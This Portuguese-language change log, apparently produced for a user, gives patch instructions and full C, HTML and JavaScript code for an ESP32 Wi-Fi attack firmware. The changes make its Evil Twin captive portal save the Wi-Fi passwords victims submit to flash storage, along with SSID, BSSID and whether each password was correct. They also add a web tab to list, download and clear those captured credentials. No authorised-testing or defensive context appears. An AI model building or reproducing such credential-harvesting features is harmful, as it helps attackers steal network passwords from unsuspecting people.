# Log persistente do Captive Portal (Evil Twin) + aba "Log" na Web UI

Este documento registra exatamente o que foi pedido e as mudanças aplicadas, para que
possam ser reproduzidas manualmente em um clone novo e "limpo" do projeto original.

## Pedido original

> "preciso que crie uma logica de guardar o log do captive portal e crie uma aba na
> interface web do projeto para o log, não altere nada no projeto original que eu não
> pedi"

Ou seja, dois requisitos:
1. Persistir (sobreviver a reboot/queda de energia, sem depender de internet) as
   credenciais capturadas pelo Evil Twin.
2. Expor esse histórico numa aba nova da interface web (`http://192.168.4.1`).
3. Não tocar em mais nada do projeto além do estritamente necessário para isso.

## Diagnóstico (antes da mudança)

- O Evil Twin (`main/wifi/attack_eviltwin.c`) já capturava a senha da vítima, mas
  guardava tudo só em variáveis de RAM (`evil_twin_password`,
  `evil_twin_captured_password`, `wrong_passwords_log`). Reboot = perde tudo.
- O SPIFFS (`/spiffs`) já estava montado pelo `components/webserver/webserver.c`
  (`init_spiffs()`), usado para servir a interface web e as páginas do captive portal
  (`/spiffs/devil_twin/*.html`).
- Não existia nenhum arquivo de log persistente nem rota HTTP para lê-lo, nem aba na UI.

## Estratégia

Reaproveitar a infraestrutura já existente (SPIFFS já montado, padrão de handlers do
`webserver.c`, componentes CSS/JS já existentes na UI) e só adicionar:
- 1 arquivo de log em texto simples, formato `uptime_ms|SSID|BSSID|senha|STATUS`,
  gravado em modo *append* (`"a"`) — nunca sobrescreve o histórico.
- 2 rotas HTTP novas: ler e limpar o log.
- 1 aba nova na UI, reaproveitando os componentes visuais já existentes
  (`card`, `table-wrap`, `info-box`, `btn-secondary`) — nenhum CSS novo foi criado.

---

## Arquivo 1/4 — `main/wifi/attack_eviltwin.c`

### 1.1 — Include necessário para `fopen`/`fprintf`

Logo abaixo de `#include <stdlib.h>`:

```c
#include <stdlib.h>
#include <stdio.h>
```

### 1.2 — Caminho do arquivo de log

Logo após `static const char *TAG = "main:evil_twin";`:

```c
static const char *TAG = "main:evil_twin";

#define EVILTWIN_LOG_PATH "/spiffs/eviltwin_log.txt"
```

### 1.3 — Forward declaration

No bloco de forward declarations (perto de `reset_wifi_to_apsta`), acrescentar:

```c
static void reset_wifi_to_apsta(const wifi_ap_record_t *target);
static void eviltwin_log_write(const wifi_ap_record_t *target, const char *password, const char *status);
```

### 1.4 — Chamar o log nos dois pontos onde a senha é decidida

Dentro de `evil_twin_task`, no branch de sucesso (`WIFI_VERIFY_CORRECT`), logo após o
`ESP_LOGI(TAG, "PASS: %s | IP: " IPSTR, ...)`:

```c
ESP_LOGI(TAG, "PASS: %s | IP: " IPSTR, evil_twin_password, IP2STR(&result.ip));
eviltwin_log_write(target, evil_twin_password, "SUCCESS");
oled_log(OLED_HEAD, 8, "Pass Captured!");
```

E no branch de senha errada (`WIFI_VERIFY_WRONG_PASSWORD`), logo após o `ESP_LOGW`:

```c
wrong_attempt_count++;
ESP_LOGW(TAG, "WRONG PASSWORD (Reason: %d)", result.disconnect_reason);
eviltwin_log_write(target, evil_twin_password, "WRONG");
```

### 1.5 — Implementação das funções

No final do arquivo, logo depois de `get_wrong_passwords(...)`:

```c
/** Replaces '|', '\r' and '\n' with a space so a single log entry can't break the line format. */
static void eviltwin_log_sanitize(char *dst, size_t dst_len, const char *src, size_t src_len) {
    size_t n = MIN(src_len, dst_len - 1);
    for (size_t i = 0; i < n; i++) {
        char c = src[i];
        dst[i] = (c == '|' || c == '\r' || c == '\n') ? ' ' : c;
    }
    dst[n] = '\0';
}

/**
 * @brief Appends one captured captive-portal credential to a persistent SPIFFS log file.
 *        Survives reboots/power loss, requires no internet connection.
 *        Line format: <uptime_ms>|<ssid>|<bssid>|<password>|<status>
 */
static void eviltwin_log_write(const wifi_ap_record_t *target, const char *password, const char *status) {
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             target->bssid[0], target->bssid[1], target->bssid[2],
             target->bssid[3], target->bssid[4], target->bssid[5]);

    char ssid_safe[33];
    eviltwin_log_sanitize(ssid_safe, sizeof(ssid_safe), (const char *)target->ssid, strnlen((const char *)target->ssid, 32));

    char pass_safe[65];
    eviltwin_log_sanitize(pass_safe, sizeof(pass_safe), password, strlen(password));

    FILE *f = fopen(EVILTWIN_LOG_PATH, "a");
    if (f == NULL) {
        ESP_LOGE(TAG, "Failed to open %s for logging", EVILTWIN_LOG_PATH);
        return;
    }
    fprintf(f, "%llu|%s|%s|%s|%s\n",
            (unsigned long long)(esp_timer_get_time() / 1000ULL),
            ssid_safe, bssid_str, pass_safe, status);
    fclose(f);
}
```

**Por que sanitizar:** a senha vem de um campo de formulário digitado pela vítima —
se ela digitar `|` ou uma quebra de linha, isso quebraria o parsing linha-a-linha
no front-end. Por isso trocamos esses caracteres por espaço antes de gravar.

**Por que `esp_timer_get_time()`:** o dispositivo fica sem internet, então não há NTP
para dar hora real. Usamos o tempo em milissegundos desde o boot (uptime), que já
estava disponível via `esp_timer.h` (já incluído no arquivo).

---

## Arquivo 2/4 — `components/webserver/webserver.c`

### 2.1 — Handler de leitura (GET)

Logo antes de `uri_evil_twin_status_handler`:

```c
static esp_err_t uri_eviltwin_log_get_handler(httpd_req_t *req) {
    return serve_file(req, "/spiffs/eviltwin_log.txt");
}
```

Reaproveita a função `serve_file()` já existente (mesma usada por
`uri_download_pass_get_handler`), que já resolve content-type (`.txt` → `text/plain`)
e trata 404 se o arquivo ainda não existir (nenhuma captura feita ainda).

### 2.2 — Handler de limpeza (POST)

Logo após `uri_detector_stop_handler`:

```c
static esp_err_t uri_eviltwin_log_clear_handler(httpd_req_t *req) {
    remove("/spiffs/eviltwin_log.txt");
    return httpd_resp_sendstr(req, "OK");
}
```

### 2.3 — Registrar as rotas na tabela de URIs

Junto aos `static httpd_uri_t uri_...` (GET):

```c
static httpd_uri_t uri_evil_status   = { .uri = "/evil-twin-status", .method = HTTP_GET,  .handler = uri_evil_twin_status_handler };
static httpd_uri_t uri_eviltwin_log  = { .uri = "/eviltwin-log",     .method = HTTP_GET,  .handler = uri_eviltwin_log_get_handler };
```

Junto aos `static httpd_uri_t uri_...` (POST):

```c
static httpd_uri_t uri_save_settings = { .uri = "/save_settings",    .method = HTTP_POST, .handler = save_settings_post_handler };
static httpd_uri_t uri_eviltwin_log_clear = { .uri = "/eviltwin-log/clear", .method = HTTP_POST, .handler = uri_eviltwin_log_clear_handler };
```

### 2.4 — Registrar os handlers em `webserver_run()`

```c
httpd_register_uri_handler(server, &uri_evil_status);
httpd_register_uri_handler(server, &uri_eviltwin_log);
```

```c
httpd_register_uri_handler(server, &uri_save_settings);
httpd_register_uri_handler(server, &uri_eviltwin_log_clear);

ESP_LOGI(TAG, "Webserver started — %d handlers registered.", 26); // era 24
```

(O número no log foi só atualizado de 24 → 26 porque são 2 handlers a mais — não é
uma mudança funcional.)

---

## Arquivo 3/4 — `data/index.html`

### 3.1 — Novo item de navegação

Entre o botão "Settings" e o botão "About" (dentro de `<nav class="bottom-nav">`):

```html
<button class="nav-item" data-tab="log" onclick="switchTab('log'); loadEvilTwinLog();">
  <div class="nav-indicator">
    <img src="/icons/eye.png" class="nav-icon" alt="">
  </div>
  <span class="nav-label">Log</span>
</button>
```

Usa o ícone `eye.png` que já existe em `data/icons/` — nenhum ícone novo foi
adicionado. A função `loadEvilTwinLog()` é chamada só quando o usuário clica na aba
(lazy load), sem mexer na função genérica `switchTab()`.

### 3.2 — Nova seção/aba

Entre `</section>` (fim da aba Settings) e `<!-- About -->`:

```html
<!-- Captive Portal Log -->
<section id="tab-log" class="tab-panel">

  <div class="info-box info-warn">
    <div class="info-label">
      <img src="/icons/tips.png" class="info-label-icon" alt="">
      Captive Portal Log
    </div>
    Every credential submitted through the Evil Twin captive portal is saved to the ESP32's
    internal flash (SPIFFS), so it survives reboots and power loss with no internet connection
    required.
  </div>

  <div class="card">
    <div class="card-header">
      <h3>Captured Credentials</h3>
      <span id="log-count-badge" class="badge">0 entries</span>
    </div>
    <div class="card-body" style="padding:0;">
      <div class="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Uptime</th>
              <th>SSID</th>
              <th>BSSID</th>
              <th>Password</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody id="eviltwin-log-list">
            <tr><td colspan="5" class="table-empty-msg">Loading…</td></tr>
          </tbody>
        </table>
      </div>
      <div class="card-footer" style="display:flex; gap:8px; flex-wrap:wrap;">
        <button onclick="loadEvilTwinLog()" class="btn-secondary">
          <img src="/icons/refresh.png" class="btn-icon" alt="">
          Refresh
        </button>
        <a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;gap:6px;"
           href="http://192.168.4.1/eviltwin-log" download="eviltwin_log.txt">
          <img src="/icons/download.png" class="btn-icon" alt="">
          Download
        </a>
        <button onclick="clearEvilTwinLog()" class="btn-secondary">
          <img src="/icons/close.png" class="btn-icon" alt="">
          Clear Log
        </button>
      </div>
    </div>
  </div>

</section>
```

Todas as classes CSS usadas (`card`, `card-header`, `card-body`, `table-wrap`,
`info-box info-warn`, `btn-secondary`, `btn-icon`, `badge`, `table-empty-msg`) já
existiam em `data/style.css` — **nenhum CSS foi criado ou alterado**.

---

## Arquivo 4/4 — `data/app.js`

Adicionado logo antes do bloco `/* ── Copy helper ─── */`:

```js
/* ── Captive Portal Log ──────────────────────────── */
function loadEvilTwinLog() {
    var tbody = document.getElementById("eviltwin-log-list");
    var badge = document.getElementById("log-count-badge");
    if (!tbody) return;
    tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">Loading…</td></tr>';

    fetch('http://192.168.4.1/eviltwin-log')
    .then(function (r) {
        if (!r.ok) throw new Error("empty");
        return r.text();
    })
    .then(function (text) {
        var lines = text.split("\n").filter(function (l) { return l.trim().length > 0; });
        if (lines.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">No credentials captured yet.</td></tr>';
            if (badge) badge.textContent = "0 entries";
            return;
        }
        tbody.innerHTML = "";
        lines.reverse().forEach(function (line) {
            var parts = line.split("|");
            if (parts.length < 5) return;
            var tr = document.createElement("tr");
            tr.innerHTML =
            '<td>' + formatUptime(parseInt(parts[0], 10)) + '</td>' +
            '<td class="td-ssid">' + escapeHtml(parts[1]) + '</td>' +
            '<td class="td-bssid"><code>' + escapeHtml(parts[2]) + '</code></td>' +
            '<td><code>' + escapeHtml(parts[3]) + '</code></td>' +
            '<td><span class="' + (parts[4] === "SUCCESS" ? "sig-strong" : "sig-weak") + '">' + escapeHtml(parts[4]) + '</span></td>';
            tbody.appendChild(tr);
        });
        if (badge) badge.textContent = lines.length + (lines.length === 1 ? " entry" : " entries");
    })
    .catch(function () {
        tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">No credentials captured yet.</td></tr>';
        if (badge) badge.textContent = "0 entries";
    });
}

function clearEvilTwinLog() {
    if (!confirm("Delete the saved captive portal log? This cannot be undone.")) return;
    fetch('/eviltwin-log/clear', { method: 'POST' })
    .then(function () { loadEvilTwinLog(); })
    .catch(function () { showError("Failed to clear log."); });
}

function formatUptime(ms) {
    if (isNaN(ms)) return "—";
    var totalSec = Math.floor(ms / 1000);
    var h = Math.floor(totalSec / 3600);
    var m = Math.floor((totalSec % 3600) / 60);
    var s = totalSec % 60;
    return (h > 0 ? h + "h " : "") + (m > 0 || h > 0 ? m + "m " : "") + s + "s";
}
```

Reaproveita helpers que já existiam no arquivo: `escapeHtml()` e `showError()`.

---

## Resultado

- `GET /eviltwin-log` → devolve o `.txt` cru com todo o histórico
  (`uptime_ms|SSID|BSSID|senha|STATUS` por linha).
- `POST /eviltwin-log/clear` → apaga o histórico.
- Aba "Log" na Web UI (`http://192.168.4.1`) → tabela com Refresh / Download / Clear.
- O arquivo `/spiffs/eviltwin_log.txt` é criado na primeira captura e cresce por
  `append` — sobrevive a reboot e queda de energia, sem precisar de internet, cartão
  SD ou qualquer dependência externa.

## Como reaplicar num clone novo

1. Clone o repositório original.
2. Abra os 4 arquivos listados acima e aplique cada trecho no ponto indicado
   (procure pelo texto de contexto citado antes de cada bloco).
3. Recompile: `idf.py build` (target `esp32`, testado com ESP-IDF v5.3).
4. Grave: `idf.py -p COMx flash` (ou `esptool` manual com os 4 `.bin` gerados em
   `build/`), gravando o SPIFFS (`storage.bin`) também — é ele que carrega a UI nova.

Se preferir não reaplicar manualmente, o `git diff` completo dessas mudanças também
pode ser exportado como patch (`git diff <commit-antes> <commit-depois> -- main/wifi/attack_eviltwin.c components/webserver/webserver.c data/index.html data/app.js`)
e aplicado com `git apply`.
